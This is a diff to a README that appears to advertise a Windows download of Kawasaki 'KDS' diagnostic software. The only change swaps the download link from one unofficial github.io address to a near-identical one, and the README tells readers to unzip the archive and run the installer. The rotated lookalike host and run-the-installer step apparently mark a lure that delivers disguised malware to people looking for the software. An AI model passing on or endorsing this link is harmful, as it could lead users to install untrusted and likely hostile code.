@@ -8,7 +8,7 @@ KDS is widely used in professional workshops and by advanced DIY enthusiasts, en
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://kawasaki-kds-windows.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://kawasaki-kds-windows-git.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
